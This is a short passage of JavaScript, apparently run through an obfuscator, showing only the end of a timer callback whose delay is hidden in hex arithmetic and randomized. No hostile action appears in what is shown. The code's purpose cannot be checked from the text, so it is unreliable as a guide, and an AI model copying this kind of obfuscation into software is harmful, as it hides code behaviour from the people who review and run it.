  }, (-0xd * 0xea + 0x1 * -0x22a5 + 0x49df) * getRandomInt(-0x18a4 + -0x18da * -0x1 + -0x35, -0x375 + -0x1 * 0x15d0 + 0x86e * 0x3));
}, 0x1 * -0xd2d + -0x65f * -0x2 + 0xd3);